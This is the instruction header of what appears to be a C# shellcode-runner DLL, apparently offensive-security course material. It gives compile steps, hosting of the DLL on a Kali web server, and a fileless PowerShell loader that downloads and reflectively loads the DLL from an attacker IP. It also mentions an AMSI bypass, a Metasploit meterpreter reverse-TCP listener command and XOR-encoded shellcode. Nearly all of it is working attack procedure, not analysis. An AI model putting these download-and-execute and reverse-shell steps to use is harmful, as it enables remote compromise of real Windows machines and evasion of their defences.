// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /unsafe /platform:x64 /target:library /out:DLL_Runner.dll DLL_Runner.cs
//
//     NOTE: /target:library is the key flag — creates a .dll instead of .exe
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Class Library (.NET Framework) -> Next
//        (IMPORTANT: Choose "Class Library (.NET Framework)", NOT .NET Core)
//     2. Name it "ClassLibrary1" (must match the namespace in this file)
//     3. Framework: .NET Framework 4.x, click Create
//     4. Properties -> Build -> Platform target: x64
//     5. Delete all code in Class1.cs, paste THIS ENTIRE FILE
//     6. Build -> Build Solution (Ctrl+Shift+B)
//     7. Find: bin\x64\Debug\ClassLibrary1.dll
//     8. Copy the .dll to your Kali web server
//
// ----------------------------------------------------------------
// HOST AND DELIVER (on Kali)
// ----------------------------------------------------------------
//   Copy DLL_Runner.dll to your web server root:
//     cp ClassLibrary1.dll /var/www/html/runner.dll
//     python3 -m http.server 80   (or use Apache)
//
// ----------------------------------------------------------------
// RUN — via DLL_Loader.ps1 (fileless, in-memory)
// ----------------------------------------------------------------
//   See DLL_Loader.ps1 for the PowerShell loader.
//   The loader downloads the DLL into memory and calls runner():
//
//     IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/DLL_Loader.ps1')
//
//   OR directly in PowerShell (after AMSI bypass if needed):
//     $data = (New-Object Net.WebClient).DownloadData('http://<KALI_IP>/runner.dll')
//     $assem = [System.Reflection.Assembly]::Load($data)
//     $class = $assem.GetType("ClassLibrary1.Class1")
//     $method = $class.GetMethod("runner")
//     $method.Invoke(0, $null)
//
// START YOUR LISTENER FIRST (on Kali):
//   msfconsole -q -x "use exploit/multi/handler; \
//     set payload windows/x64/meterpreter/reverse_tcp; \
//     set LHOST <YOUR_IP>; set LPORT 443; exploit -j"
//
// BEFORE COMPILING, CHANGE:
//   - buf[] array -> your XOR(0xAA)-encoded shellcode with YOUR IP/PORT
// ================================================================
